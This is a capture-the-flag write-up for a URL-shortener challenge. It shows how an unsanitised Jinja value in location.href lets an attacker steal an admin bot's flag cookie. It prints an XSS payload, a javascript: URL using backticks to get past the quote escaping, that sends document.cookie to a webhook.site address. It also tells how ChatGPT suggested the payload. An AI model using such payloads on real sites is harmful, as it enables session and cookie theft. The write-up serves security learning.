## Challenge

> Simple URL shortener. What could go wrong?
> 
> http://challs2.nusgreyhats.org:33001/

## Solution

Ctrl+F on the file given, with `FLAG`, we see where the flag can be given: the admin bot! In `bot.js`, under function `visitSubmission`:

```js
await page.setCookie({
    name: 'admin_flag',
    value: FLAG,
    domain: hostname,
    path: '/',
    httpOnly: false,
    secure: false
})
try {
    await page.goto(BASE_URL + id, { waitUntil: 'networkidle2', timeout: 5000 })
}
catch (e) {
    console.log(e)
}
```

Where `BASE_URL = process.env.BASE_URL || 'http://web-oops-app:5000/'`, and `hostname = new URL(BASE_URL).hostname`, which means it only visits the webpage itself. So, this challenge is about somehow stealing the cookie being set to `web-oops-app`.

And surely, there is a Jinja template that potentially allow us to do that:

```html
<script>
    location.href = "{{url}}"
</script>
```

Where `url` can be provided by us. Note that `url` does not have any input sanitation. First thing that comes to my mind is, just inject the url with `"`. Right?

```
#"; fetch("https://http://webhook.site/928039f6-43f5-49f2-8b28-b6d4ee9295ee"); //
```

Err, nothing? Well, I can go to the link and check it out myself. Turns out, the Jinja syntax `{{url}}` escapes all double quotes.

```html
<script>
    location.href = "#&#34;; fetch(&#34;https://http://webhook.site/928039f6-43f5-49f2-8b28-b6d4ee9295ee&#34;); //"
</script>
```

Ooof, that means the redirection is for real -_- Out of ideas, I asked ChatGPT,

```md
A webpage has a following jinja template:

<script>
    location.href = "{{url}}"
</script>

Where url can be determined by the user. Note that this template has default sanitation. What value of url can the user set, so that upon visiting this page, the browser will make a fetch request to https://example.com ?
```

And ChatGPT suggested the following payload:

```
javascript:fetch('https://example.com')
```

Ohh, that makes the webpage actually not redirecting, but instead make a fetch request. Okay, so we are getting somewhere, but the apostrophe is still being escaped -_-,

```html
<script>
    location.href = "javascript:fetch(&#39;https://example.com&#39;)"
</script>
```

Come on ChatGPT! You can do a better job ...

```html
<script>
    location.href = "javascript:fetch(`https://example.com`)"
</script>
```

Ohh yes! The backticks are not being escaped by Jinja! From there, we can easily include the document cookie in the payload!

Now, we change the endpoint to our webhook instead of `example.com`, the payload is as follows:

```
javascript:fetch(`http://webhook.site/928039f6-43f5-49f2-8b28-b6d4ee9295ee/?${document.cookie}`)
```
